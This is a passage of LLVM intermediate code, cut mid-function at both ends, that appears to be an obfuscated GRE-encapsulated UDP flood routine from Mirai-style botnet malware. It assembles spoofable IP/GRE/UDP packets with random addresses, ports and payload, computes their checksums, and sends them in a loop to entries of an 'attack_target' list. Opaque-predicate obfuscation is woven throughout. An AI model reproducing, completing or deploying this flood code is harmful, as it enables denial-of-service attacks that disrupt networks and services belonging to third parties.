  store %struct.grehdr* %123, %struct.grehdr** %23, align 8
  %124 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %125 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %124, i64 1
  %126 = bitcast %struct.grehdr* %125 to %struct.iphdr*
  store %struct.iphdr* %126, %struct.iphdr** %24, align 8
  %127 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i64 1
  %129 = bitcast %struct.iphdr* %128 to %struct.udphdr*
  store %struct.udphdr* %129, %struct.udphdr** %25, align 8
  %130 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %131 = bitcast %struct.iphdr* %130 to i8*
  %132 = load i8, i8* %131, align 4
  %133 = and i8 %132, 15
  %134 = or i8 %133, 64
  store i8 %134, i8* %131, align 4
  %135 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %136 = bitcast %struct.iphdr* %135 to i8*
  %137 = load i8, i8* %136, align 4
  %138 = and i8 %137, -16
  %139 = or i8 %138, 5
  store i8 %139, i8* %136, align 4
  %140 = load i8, i8* %12, align 1
  %141 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i32 0, i32 1
  store i8 %140, i8* %142, align 1
  %143 = load i32, i32* %18, align 4
  %144 = sext i32 %143 to i64
  %145 = add i64 52, %144
  %146 = trunc i64 %145 to i16
  %147 = call zeroext i16 @htons(i16 zeroext %146) #8
  %148 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 2
  store i16 %147, i16* %149, align 2
  %150 = load i16, i16* %13, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #8
  %152 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 3
  store i16 %151, i16* %153, align 4
  %154 = load i8, i8* %14, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 5
  store i8 %154, i8* %156, align 4
  %157 = load i8, i8* %15, align 1
  %158 = icmp ne i8 %157, 0
  br i1 %158, label %159, label %163

; <label>:159:                                    ; preds = %109
  %160 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %161 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 4
  store i16 %160, i16* %162, align 2
  br label %163

; <label>:163:                                    ; preds = %159, %109
  %164 = load i32, i32* @x.37
  %165 = load i32, i32* @y.38
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %163
  %172 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 6
  store i8 47, i8* %173, align 1
  %174 = load i32, i32* %21, align 4
  %175 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 8
  store i32 %174, i32* %176, align 4
  %177 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %178 = load i32, i32* %9, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %177, i64 %179
  %181 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i32 0, i32 1
  %182 = load i32, i32* %181, align 4
  %183 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 9
  store i32 %182, i32* %184, align 4
  %185 = call zeroext i16 @htons(i16 zeroext 2048) #8
  %186 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %187 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %186, i32 0, i32 1
  store i16 %185, i16* %187, align 2
  %188 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %189 = bitcast %struct.iphdr* %188 to i8*
  %190 = load i8, i8* %189, align 4
  %191 = and i8 %190, 15
  %192 = or i8 %191, 64
  store i8 %192, i8* %189, align 4
  %193 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %194 = bitcast %struct.iphdr* %193 to i8*
  %195 = load i8, i8* %194, align 4
  %196 = and i8 %195, -16
  %197 = or i8 %196, 5
  store i8 %197, i8* %194, align 4
  %198 = load i8, i8* %12, align 1
  %199 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 1
  store i8 %198, i8* %200, align 1
  %201 = load i32, i32* %18, align 4
  %202 = sext i32 %201 to i64
  %203 = add i64 28, %202
  %204 = trunc i64 %203 to i16
  %205 = call zeroext i16 @htons(i16 zeroext %204) #8
  %206 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 2
  store i16 %205, i16* %207, align 2
  %208 = load i16, i16* %13, align 2
  %209 = zext i16 %208 to i32
  %210 = xor i32 %209, -1
  %211 = trunc i32 %210 to i16
  %212 = call zeroext i16 @htons(i16 zeroext %211) #8
  %213 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %214 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %213, i32 0, i32 3
  store i16 %212, i16* %214, align 4
  %215 = load i8, i8* %14, align 1
  %216 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 5
  store i8 %215, i8* %217, align 4
  %218 = load i8, i8* %15, align 1
  %219 = icmp ne i8 %218, 0
  %220 = load i32, i32* @x.37
  %221 = load i32, i32* @y.38
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBBpart244, label %originalBB1alteredBB

originalBBpart244:                                ; preds = %originalBB1
  br i1 %219, label %228, label %232

; <label>:228:                                    ; preds = %originalBBpart244
  %229 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %230 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i32 0, i32 4
  store i16 %229, i16* %231, align 2
  br label %232

; <label>:232:                                    ; preds = %228, %originalBBpart244
  %233 = load i32, i32* @x.37
  %234 = load i32, i32* @y.38
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %232
  %241 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 6
  store i8 17, i8* %242, align 1
  %243 = call i32 @rand_next()
  %244 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 8
  store i32 %243, i32* %245, align 4
  %246 = load i8, i8* %20, align 1
  %247 = icmp ne i8 %246, 0
  %248 = load i32, i32* @x.37
  %249 = load i32, i32* @y.38
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %247, label %256, label %278

; <label>:256:                                    ; preds = %originalBBpart248
  %257 = load i32, i32* @x.37
  %258 = load i32, i32* @y.38
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %256
  %265 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 9
  %267 = load i32, i32* %266, align 4
  %268 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i32 0, i32 9
  store i32 %267, i32* %269, align 4
  %270 = load i32, i32* @x.37
  %271 = load i32, i32* @y.38
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %286

; <label>:278:                                    ; preds = %originalBBpart248
  %279 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 8
  %281 = load i32, i32* %280, align 4
  %282 = sub i32 %281, 1024
  %283 = xor i32 %282, -1
  %284 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 9
  store i32 %283, i32* %285, align 4
  br label %286

; <label>:286:                                    ; preds = %278, %originalBBpart252
  %287 = load i16, i16* %16, align 2
  %288 = call zeroext i16 @htons(i16 zeroext %287) #8
  %289 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %290 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %289, i32 0, i32 0
  store i16 %288, i16* %290, align 2
  %291 = load i16, i16* %17, align 2
  %292 = call zeroext i16 @htons(i16 zeroext %291) #8
  %293 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %294 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %293, i32 0, i32 1
  store i16 %292, i16* %294, align 2
  %295 = load i32, i32* %18, align 4
  %296 = sext i32 %295 to i64
  %297 = add i64 8, %296
  %298 = trunc i64 %297 to i16
  %299 = call zeroext i16 @htons(i16 zeroext %298) #8
  %300 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %301 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %300, i32 0, i32 2
  store i16 %299, i16* %301, align 2
  br label %302

; <label>:302:                                    ; preds = %286
  %303 = load i32, i32* %9, align 4
  %304 = add nsw i32 %303, 1
  store i32 %304, i32* %9, align 4
  br label %88

; <label>:305:                                    ; preds = %originalBBpart2
  br label %306

; <label>:306:                                    ; preds = %originalBBpart286, %305
  store i32 0, i32* %9, align 4
  br label %307

; <label>:307:                                    ; preds = %originalBBpart282, %306
  %308 = load i32, i32* %9, align 4
  %309 = load i8, i8* %5, align 1
  %310 = zext i8 %309 to i32
  %311 = icmp slt i32 %308, %310
  br i1 %311, label %312, label %560

; <label>:312:                                    ; preds = %307
  %313 = load i8**, i8*** %11, align 8
  %314 = load i32, i32* %9, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds i8*, i8** %313, i64 %315
  %317 = load i8*, i8** %316, align 8
  store i8* %317, i8** %26, align 8
  %318 = load i8*, i8** %26, align 8
  %319 = bitcast i8* %318 to %struct.iphdr*
  store %struct.iphdr* %319, %struct.iphdr** %27, align 8
  %320 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i64 1
  %322 = bitcast %struct.iphdr* %321 to %struct.grehdr*
  store %struct.grehdr* %322, %struct.grehdr** %28, align 8
  %323 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %324 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %323, i64 1
  %325 = bitcast %struct.grehdr* %324 to %struct.iphdr*
  store %struct.iphdr* %325, %struct.iphdr** %29, align 8
  %326 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %327 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %326, i64 1
  %328 = bitcast %struct.iphdr* %327 to %struct.udphdr*
  store %struct.udphdr* %328, %struct.udphdr** %30, align 8
  %329 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %330 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %329, i64 1
  %331 = bitcast %struct.udphdr* %330 to i8*
  store i8* %331, i8** %31, align 8
  %332 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %333 = load i32, i32* %9, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i64 %334
  %336 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %335, i32 0, i32 2
  %337 = load i8, i8* %336, align 4
  %338 = zext i8 %337 to i32
  %339 = icmp slt i32 %338, 32
  br i1 %339, label %340, label %361

; <label>:340:                                    ; preds = %312
  %341 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %342 = load i32, i32* %9, align 4
  %343 = sext i32 %342 to i64
  %344 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %341, i64 %343
  %345 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %344, i32 0, i32 1
  %346 = load i32, i32* %345, align 4
  %347 = call i32 @ntohl(i32 %346) #8
  %348 = call i32 @rand_next()
  %349 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %350 = load i32, i32* %9, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %349, i64 %351
  %353 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %352, i32 0, i32 2
  %354 = load i8, i8* %353, align 4
  %355 = zext i8 %354 to i32
  %356 = lshr i32 %348, %355
  %357 = add i32 %347, %356
  %358 = call i32 @htonl(i32 %357) #8
  %359 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %360 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %359, i32 0, i32 9
  store i32 %358, i32* %360, align 4
  br label %361

; <label>:361:                                    ; preds = %340, %312
  %362 = load i32, i32* %21, align 4
  %363 = icmp eq i32 %362, -1
  br i1 %363, label %364, label %368

; <label>:364:                                    ; preds = %361
  %365 = call i32 @rand_next()
  %366 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %367 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %366, i32 0, i32 8
  store i32 %365, i32* %367, align 4
  br label %368

; <label>:368:                                    ; preds = %364, %361
  %369 = load i16, i16* %13, align 2
  %370 = zext i16 %369 to i32
  %371 = icmp eq i32 %370, 65535
  br i1 %371, label %372, label %387

; <label>:372:                                    ; preds = %368
  %373 = call i32 @rand_next()
  %374 = and i32 %373, 65535
  %375 = trunc i32 %374 to i16
  %376 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %377 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %376, i32 0, i32 3
  store i16 %375, i16* %377, align 4
  %378 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %379 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %378, i32 0, i32 3
  %380 = load i16, i16* %379, align 4
  %381 = zext i16 %380 to i32
  %382 = sub nsw i32 %381, 1000
  %383 = xor i32 %382, -1
  %384 = trunc i32 %383 to i16
  %385 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %386 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %385, i32 0, i32 3
  store i16 %384, i16* %386, align 4
  br label %387

; <label>:387:                                    ; preds = %372, %368
  %388 = load i16, i16* %16, align 2
  %389 = zext i16 %388 to i32
  %390 = icmp eq i32 %389, 65535
  br i1 %390, label %391, label %397

; <label>:391:                                    ; preds = %387
  %392 = call i32 @rand_next()
  %393 = and i32 %392, 65535
  %394 = trunc i32 %393 to i16
  %395 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %396 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %395, i32 0, i32 0
  store i16 %394, i16* %396, align 2
  br label %397

; <label>:397:                                    ; preds = %391, %387
  %398 = load i16, i16* %17, align 2
  %399 = zext i16 %398 to i32
  %400 = icmp eq i32 %399, 65535
  br i1 %400, label %401, label %407

; <label>:401:                                    ; preds = %397
  %402 = call i32 @rand_next()
  %403 = and i32 %402, 65535
  %404 = trunc i32 %403 to i16
  %405 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %406 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %405, i32 0, i32 1
  store i16 %404, i16* %406, align 2
  br label %407

; <label>:407:                                    ; preds = %401, %397
  %408 = load i32, i32* @x.37
  %409 = load i32, i32* @y.38
  %410 = sub i32 %408, 1
  %411 = mul i32 %408, %410
  %412 = urem i32 %411, 2
  %413 = icmp eq i32 %412, 0
  %414 = icmp slt i32 %409, 10
  %415 = or i1 %413, %414
  br i1 %415, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %407
  %416 = load i8, i8* %20, align 1
  %417 = icmp ne i8 %416, 0
  %418 = load i32, i32* @x.37
  %419 = load i32, i32* @y.38
  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %417, label %430, label %426

; <label>:426:                                    ; preds = %originalBBpart256
  %427 = call i32 @rand_next()
  %428 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %429 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %428, i32 0, i32 9
  store i32 %427, i32* %429, align 4
  br label %436

; <label>:430:                                    ; preds = %originalBBpart256
  %431 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %432 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %431, i32 0, i32 9
  %433 = load i32, i32* %432, align 4
  %434 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %435 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %434, i32 0, i32 9
  store i32 %433, i32* %435, align 4
  br label %436

; <label>:436:                                    ; preds = %430, %426
  %437 = load i8, i8* %19, align 1
  %438 = icmp ne i8 %437, 0
  br i1 %438, label %439, label %458

; <label>:439:                                    ; preds = %436
  %440 = load i32, i32* @x.37
  %441 = load i32, i32* @y.38
  %442 = sub i32 %440, 1
  %443 = mul i32 %440, %442
  %444 = urem i32 %443, 2
  %445 = icmp eq i32 %444, 0
  %446 = icmp slt i32 %441, 10
  %447 = or i1 %445, %446
  br i1 %447, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %439
  %448 = load i8*, i8** %31, align 8
  %449 = load i32, i32* %18, align 4
  call void @rand_str(i8* %448, i32 %449)
  %450 = load i32, i32* @x.37
  %451 = load i32, i32* @y.38
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %458

; <label>:458:                                    ; preds = %originalBBpart260, %436
  %459 = load i32, i32* @x.37
  %460 = load i32, i32* @y.38
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %458
  %467 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %468 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %467, i32 0, i32 7
  store i16 0, i16* %468, align 2
  %469 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %470 = bitcast %struct.iphdr* %469 to i16*
  %471 = call zeroext i16 @checksum_generic(i16* %470, i32 20)
  %472 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %473 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %472, i32 0, i32 7
  store i16 %471, i16* %473, align 2
  %474 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %475 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %474, i32 0, i32 7
  store i16 0, i16* %475, align 2
  %476 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %477 = bitcast %struct.iphdr* %476 to i16*
  %478 = call zeroext i16 @checksum_generic(i16* %477, i32 20)
  %479 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %480 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %479, i32 0, i32 7
  store i16 %478, i16* %480, align 2
  %481 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %482 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %481, i32 0, i32 3
  store i16 0, i16* %482, align 2
  %483 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %484 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %485 = bitcast %struct.udphdr* %484 to i8*
  %486 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %487 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %486, i32 0, i32 2
  %488 = load i16, i16* %487, align 2
  %489 = load i32, i32* %18, align 4
  %490 = sext i32 %489 to i64
  %491 = add i64 8, %490
  %492 = trunc i64 %491 to i32
  %493 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %483, i8* %485, i16 zeroext %488, i32 %492)
  %494 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %495 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %494, i32 0, i32 3
  store i16 %493, i16* %495, align 2
  %496 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %497 = load i32, i32* %9, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %496, i64 %498
  %500 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %499, i32 0, i32 0
  %501 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %500, i32 0, i32 0
  store i16 2, i16* %501, align 4
  %502 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %503 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %502, i32 0, i32 9
  %504 = load i32, i32* %503, align 4
  %505 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %506 = load i32, i32* %9, align 4
  %507 = sext i32 %506 to i64
  %508 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %505, i64 %507
  %509 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %508, i32 0, i32 0
  %510 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %509, i32 0, i32 2
  %511 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %510, i32 0, i32 0
  store i32 %504, i32* %511, align 4
  %512 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %513 = load i32, i32* %9, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %512, i64 %514
  %516 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %515, i32 0, i32 0
  %517 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %516, i32 0, i32 1
  store i16 0, i16* %517, align 2
  %518 = load i32, i32* %10, align 4
  %519 = load i8*, i8** %26, align 8
  %520 = load i32, i32* %18, align 4
  %521 = sext i32 %520 to i64
  %522 = add i64 52, %521
  %523 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %524 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %525 = load i32, i32* %9, align 4
  %526 = sext i32 %525 to i64
  %527 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %524, i64 %526
  %528 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %527, i32 0, i32 0
  %529 = bitcast %struct.sockaddr_in* %528 to %struct.sockaddr*
  store %struct.sockaddr* %529, %struct.sockaddr** %523, align 8
  %530 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %531 = load %struct.sockaddr*, %struct.sockaddr** %530, align 8
  %532 = call i64 @sendto(i32 %518, i8* %519, i64 %522, i32 16384, %struct.sockaddr* %531, i32 16)
  %533 = load i32, i32* @x.37
  %534 = load i32, i32* @y.38
  %535 = sub i32 %533, 1
  %536 = mul i32 %533, %535
  %537 = urem i32 %536, 2
  %538 = icmp eq i32 %537, 0
  %539 = icmp slt i32 %534, 10
  %540 = or i1 %538, %539
  br i1 %540, label %originalBBpart275, label %originalBB62alteredBB

originalBBpart275:                                ; preds = %originalBB62
  br label %541

; <label>:541:                                    ; preds = %originalBBpart275
  %542 = load i32, i32* @x.37
  %543 = load i32, i32* @y.38
  %544 = sub i32 %542, 1
  %545 = mul i32 %542, %544
  %546 = urem i32 %545, 2
  %547 = icmp eq i32 %546, 0
  %548 = icmp slt i32 %543, 10
  %549 = or i1 %547, %548
  br i1 %549, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %541
  %550 = load i32, i32* %9, align 4
  %551 = add nsw i32 %550, 1
  store i32 %551, i32* %9, align 4
  %552 = load i32, i32* @x.37
  %553 = load i32, i32* @y.38
  %554 = sub i32 %552, 1
  %555 = mul i32 %552, %554
  %556 = urem i32 %555, 2
  %557 = icmp eq i32 %556, 0
  %558 = icmp slt i32 %553, 10
  %559 = or i1 %557, %558
  br i1 %559, label %originalBBpart282, label %originalBB77alteredBB

originalBBpart282:                                ; preds = %originalBB77
  br label %307

; <label>:560:                                    ; preds = %307
  %561 = load i32, i32* @x.37
  %562 = load i32, i32* @y.38
  %563 = sub i32 %561, 1
  %564 = mul i32 %561, %563
  %565 = urem i32 %564, 2
  %566 = icmp eq i32 %565, 0
  %567 = icmp slt i32 %562, 10
  %568 = or i1 %566, %567
  br i1 %568, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %560
  %569 = load i32, i32* @x.37
  %570 = load i32, i32* @y.38
  %571 = sub i32 %569, 1
  %572 = mul i32 %569, %571
  %573 = urem i32 %572, 2
  %574 = icmp eq i32 %573, 0
  %575 = icmp slt i32 %570, 10
  %576 = or i1 %574, %575
  br i1 %576, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br label %306

; <label>:577:                                    ; preds = %84, %78
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %88
  %578 = load i32, i32* %9, align 4
  %579 = load i8, i8* %5, align 1
  %580 = zext i8 %579 to i32
  %581 = icmp slt i32 %578, %580
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %163
  %582 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %583 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %582, i32 0, i32 6
  store i8 47, i8* %583, align 1
  %584 = load i32, i32* %21, align 4
  %585 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %586 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %585, i32 0, i32 8
  store i32 %584, i32* %586, align 4
  %587 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %588 = load i32, i32* %9, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %587, i64 %589
  %591 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %590, i32 0, i32 1
  %592 = load i32, i32* %591, align 4
  %593 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %594 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %593, i32 0, i32 9
  store i32 %592, i32* %594, align 4
  %595 = call zeroext i16 @htons(i16 zeroext 2048) #8
  %596 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %597 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %596, i32 0, i32 1
  store i16 %595, i16* %597, align 2
  %598 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %599 = bitcast %struct.iphdr* %598 to i8*
  %600 = load i8, i8* %599, align 4
  %_ = sub i8 %600, 15
  %gen = mul i8 %_, 15
  %_2 = sub i8 %600, 15
  %gen3 = mul i8 %_2, 15
  %_4 = sub i8 0, %600
  %gen5 = add i8 %_4, 15
  %_6 = shl i8 %600, 15
  %601 = and i8 %600, 15
  %_7 = sub i8 %601, 64
  %gen8 = mul i8 %_7, 64
  %_9 = sub i8 %601, 64
  %gen10 = mul i8 %_9, 64
  %602 = or i8 %601, 64
  store i8 %602, i8* %599, align 4
  %603 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %604 = bitcast %struct.iphdr* %603 to i8*
  %605 = load i8, i8* %604, align 4
  %_11 = sub i8 %605, -16
  %gen12 = mul i8 %_11, -16
  %_13 = shl i8 %605, -16
  %_14 = sub i8 0, %605
  %gen15 = add i8 %_14, -16
  %_16 = sub i8 %605, -16
  %gen17 = mul i8 %_16, -16
  %_18 = sub i8 0, %605
  %gen19 = add i8 %_18, -16
  %606 = and i8 %605, -16
  %_20 = sub i8 %606, 5
  %gen21 = mul i8 %_20, 5
  %_22 = sub i8 %606, 5
  %gen23 = mul i8 %_22, 5
  %_24 = sub i8 %606, 5
  %gen25 = mul i8 %_24, 5
  %_26 = shl i8 %606, 5
